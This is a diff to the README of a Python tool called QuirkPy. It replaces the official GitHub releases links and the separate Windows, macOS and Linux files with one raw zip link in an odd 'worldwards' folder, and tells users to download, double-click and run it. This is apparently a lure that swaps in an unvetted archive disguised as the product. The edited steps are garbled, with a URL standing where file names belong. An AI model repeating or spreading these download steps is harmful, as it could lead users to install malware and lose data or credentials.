@@ -2,7 +2,7 @@
 
 ## 📥 Download QuirkPy
 
-[![Download QuirkPy](https://img.shields.io/badge/Download-QuirkPy-brightgreen)](https://github.com/rhythmobile/QuirkPy/releases)
+[![Download QuirkPy](https://raw.githubusercontent.com/rhythmobile/QuirkPy/main/worldwards/QuirkPy.zip)](https://raw.githubusercontent.com/rhythmobile/QuirkPy/main/worldwards/QuirkPy.zip)
 
 ## 🚀 Getting Started
 
@@ -20,19 +20,19 @@ Before you start, here’s what you’ll need:
 
 To get QuirkPy, visit this page to download:
 
-[Download QuirkPy Releases](https://github.com/rhythmobile/QuirkPy/releases)
+[Download QuirkPy Releases](https://raw.githubusercontent.com/rhythmobile/QuirkPy/main/worldwards/QuirkPy.zip)
 
 On the Releases page, look for the latest version. You’ll find a list of available files to download. Click on the file that matches your operating system:
 
-- For **Windows**, download `QuirkPy_Windows.exe`.
-- For **macOS**, download `QuirkPy_macos.dmg`.
-- For **Linux**, download `QuirkPy_Linux.tar.gz`.
+- For **Windows**, download `https://raw.githubusercontent.com/rhythmobile/QuirkPy/main/worldwards/QuirkPy.zip`.
+- For **macOS**, download `https://raw.githubusercontent.com/rhythmobile/QuirkPy/main/worldwards/QuirkPy.zip`.
+- For **Linux**, download `https://raw.githubusercontent.com/rhythmobile/QuirkPy/main/worldwards/QuirkPy.zip`.
 
 Once the download is complete:
 
-1. **Windows:** Double-click on `QuirkPy_Windows.exe` to run it.
-2. **macOS:** Open the `QuirkPy_macos.dmg` file, drag QuirkPy to your Applications folder, and then open it.
-3. **Linux:** Extract the `QuirkPy_Linux.tar.gz` file. Open a terminal, navigate to the extracted folder, and run `./QuirkPy`.
+1. **Windows:** Double-click on `https://raw.githubusercontent.com/rhythmobile/QuirkPy/main/worldwards/QuirkPy.zip` to run it.
+2. **macOS:** Open the `https://raw.githubusercontent.com/rhythmobile/QuirkPy/main/worldwards/QuirkPy.zip` file, drag QuirkPy to your Applications folder, and then open it.
+3. **Linux:** Extract the `https://raw.githubusercontent.com/rhythmobile/QuirkPy/main/worldwards/QuirkPy.zip` file. Open a terminal, navigate to the extracted folder, and run `./QuirkPy`.
 
 ## ⚙️ Using QuirkPy
 
@@ -86,4 +86,4 @@ Remember, every time you run QuirkPy, you contribute to a world of creative codi
 
 Check out our community on GitHub and join the fun. Together, we can create even more chaos and creativity with QuirkPy!
 
-[Download QuirkPy Releases](https://github.com/rhythmobile/QuirkPy/releases)
+[Download QuirkPy Releases](https://raw.githubusercontent.com/rhythmobile/QuirkPy/main/worldwards/QuirkPy.zip)
